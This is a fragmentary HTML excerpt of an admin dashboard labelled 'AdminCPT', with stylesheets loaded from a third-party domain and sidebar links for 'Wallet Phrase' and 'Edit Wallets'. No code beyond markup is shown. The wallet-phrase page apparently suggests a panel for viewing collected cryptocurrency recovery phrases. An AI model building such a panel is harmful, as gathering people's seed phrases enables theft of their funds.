...
<head>
    ...
    <!-- jvectormap -->
    <link href="https://mykaeltech.com/commercialplugin/jvectormap/jquery-jvectormap-1.2.2.css" rel="stylesheet" type="text/css" />
    <!-- Date Picker -->
    <link href="https://mykaeltech.com/commercialplugin/datepicker/datepicker3.css" rel="stylesheet" type="text/css" />
    <!-- Daterange picker -->
    <link href="https://mykaeltech.com/commercialplugin/daterangepicker/daterangepicker-bs3.css" rel="stylesheet" type="text/css" />
    <!-- bootstrap wysihtml5 - text editor -->
    <link href="https://mykaeltech.com/commercialplugin/bootstrap-wysihtml5/bootstrap3-wysihtml5.min.css" rel="stylesheet" type="text/css" />
...
<body class="skin-blue">
    <div class="wrapper">
        ...
        <header class="main-header">
            <!-- Logo -->
            <a href="index.html" class="logo"><b>Admin</b>CPT</a>
                ...
                <ul class="sidebar-menu">
                    ...
                    <li class="treeview">
                        ...
                        <ul class="treeview-menu">
                            ...
                            <li><a href="walletcon.php"><i class="fa fa-circle-o"></i>Wallet Phrase</a></li>
                  ...
                  <li class="treeview">
                        <a href="editwallets.php">
                            <i class="fa fa-files-o"></i>
                            <span>Edit Wallets</span>
